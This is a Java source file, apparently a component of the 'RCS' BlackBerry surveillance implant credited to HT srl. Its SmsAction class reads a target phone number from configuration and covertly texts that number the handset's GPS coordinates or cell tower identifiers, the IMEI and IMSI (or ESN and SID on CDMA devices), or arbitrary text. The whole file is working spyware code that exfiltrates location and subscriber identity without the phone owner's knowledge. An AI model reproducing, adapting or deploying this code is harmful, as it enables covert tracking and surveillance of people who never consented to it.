//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;
import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;
import javax.microedition.location.QualifiedCoordinates;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.io.SmsAddress;
import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.SMSPacketHeader;
import net.rim.device.api.system.SMSParameters;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Conf;
import blackberry.Device;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;
import blackberry.log.LogType;
import blackberry.sms.SMSHelper;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsAction.
 */
public final class SmsAction extends SubAction implements LocationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("SmsAction", DebugLevel.VERBOSE);
    //#endif

    private static final int TYPE_LOCATION = 1;
    private static final int TYPE_SIM = 2;
    private static final int TYPE_TEXT = 3;


    String number;
    String text;
    int type;

    /**
     * Instantiates a new sms action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public SmsAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        try {
            switch (type) {
            case TYPE_TEXT:
            case TYPE_SIM:
                return sendSMS(text);

            case TYPE_LOCATION:
                // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                if (!getGPSPosition()) {
                    errorLocation();
                }

                break;
            }
            return true;
        } catch (Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error(ex);
            //#endif
            return false;
        }
    }

    private boolean getCellPosition() {

        //#ifdef DEBUG_TRACE
        debug.trace("getCellPosition");
        //#endif
        String message;

        try {
            final boolean gprs = !Device.isCDMA();
            if (gprs) {
                // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
                // CC e MNC possono essere estratti da IMEI
                // http://en.wikipedia.org/wiki/Mobile_country_code
                // http://en.wikipedia.org/wiki/Mobile_Network_Code
                final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

                final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
                        .getMCC()));

                final int mnc = cellinfo.getMNC();
                final int lac = cellinfo.getLAC();
                final int cid = cellinfo.getCellId();

                final int bsic = GPRSInfo.getCellInfo().getBSIC();

                final StringBuffer mb = new StringBuffer();
                mb.append("MCC: " + mcc);
                mb.append(" MNC: " + mnc);
                mb.append(" LAC: " + lac);
                mb.append(" CID: " + cid);
                message = mb.toString();
            } else {
                final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
                //CDMAInfo.getIMSI()
                final int sid = cellinfo.getSID();
                final int nid = cellinfo.getNID();
                final int bid = cellinfo.getBID();

                final StringBuffer mb = new StringBuffer();
                mb.append("SID: " + sid);
                mb.append(" NID: " + nid);
                mb.append(" BID: " + bid);
                message = mb.toString();
            }
            //#ifdef DEBUG_INFO
            debug.info(message);
            //#endif

            return sendSMS(message);
        } catch (Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error(ex);
            //#endif
            return false;
        }
    }

    private boolean getGPSPosition() {

        LocationProvider lp = null;
        Criteria criteria = new Criteria();
        criteria.setCostAllowed(true);

        criteria.setHorizontalAccuracy(50);
        criteria.setVerticalAccuracy(50);
        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);

        try {
            lp = LocationProvider.getInstance(criteria);
        } catch (Exception e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
            return false;
        }
        
        if (lp == null) {
            //#ifdef DEBUG_ERROR
            debug.error("GPS Not Supported on Device");
            //#endif               
            return false;
        }

        if (waitingForPoint) {
            //#ifdef DEBUG_TRACE
            debug.trace("waitingForPoint");
            //#endif
            return false;
        }

        synchronized (this) {
            LocationHelper.getInstance().locationGPS(lp, this, true);
        }

        return true;
    }

    public void newLocation(Location loc) {
        //#ifdef DEBUG_TRACE
        debug.trace("newLocation");
        //#endif

        if (loc == null) {
            //#ifdef DEBUG_ERROR
            debug.error("Error in getLocation");
            //#endif  
            return;
        }

        float speed = loc.getSpeed();
        float course = loc.getCourse();

        QualifiedCoordinates qc = loc.getQualifiedCoordinates();
        if (qc == null) {
            //#ifdef DEBUG_ERROR
            debug.error("Cannot get QualifiedCoordinates");
            //#endif                        
            errorLocation();
        }

        StringBuffer sb = new StringBuffer();
        sb.append("LAT: " + qc.getLatitude() + "\r\n");
        sb.append("LON: " + qc.getLongitude() + "\r\n");

        sendSMS(sb.toString());

    }

    public synchronized void errorLocation() {
        //#ifdef DEBUG_ERROR
        debug.error("Cannot get Location");
        //#endif  

        if (!getCellPosition()) {
            sendSMS("Cell and GPS info not available");
        }
    }

    boolean waitingForPoint;

    public synchronized void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

    boolean sendSMS(final String message) {
        boolean ret = true;
        if (Device.isCDMA()) {
            //#ifdef DEBUG_TRACE
            debug.trace("sendSMS: Datagram");
            //#endif
            ret = SMSHelper.sendSMSDatagram(number, message);
        } else {
            //#ifdef DEBUG_TRACE
            //debug.trace("sendSMS: Binary");
            //#endif
            //ret = sendSMSBinary(message);

            //#ifdef DEBUG_TRACE
            //debug.trace("sendSMS: Text");
            //#endif
            ret = SMSHelper.sendSMSText(number, message);
        }
        return ret;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            type = databuffer.readInt();

            //#ifdef DBC
            Check.asserts(type >= 1 && type <= 3, "wrong type");
            //#endif

            int len = databuffer.readInt();
            byte[] buffer = new byte[len];
            databuffer.read(buffer);
            number = Utils.Unspace(WChar.getString(buffer, true));

            switch (type) {
            case TYPE_TEXT:
                len = databuffer.readInt();
                buffer = new byte[len];
                databuffer.read(buffer);
                text = WChar.getString(buffer, true);
                break;
            case TYPE_LOCATION:
                // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                break;
            case TYPE_SIM:
                StringBuffer sb = new StringBuffer();
                Device device = Device.getInstance();
                if (Device.isCDMA()) {

                    sb.append("SID: " + device.getSid() + "\n");
                    sb.append("ESN: "
                            + NumberUtilities.toString(device.getEsn(), 16)
                            + "\n");
                } else {
                    sb.append("IMEI: " + device.getImei() + "\n");
                    sb.append("IMSI: " + device.getImsi() + "\n");
                }

                text = sb.toString();
                break;
            default:
                //#ifdef DEBUG_ERROR
                debug.error("SmsAction.parse,  Unknown type: " + type);
                //#endif
                break;
            }

        } catch (final EOFException e) {

            return false;
        }

        return true;
    }

    public String toString() {
        final StringBuffer sb = new StringBuffer();
        sb.append("Sms type: " + type);
        sb.append(" number: " + number);
        sb.append(" text: " + text);

        return sb.toString();
    }

}
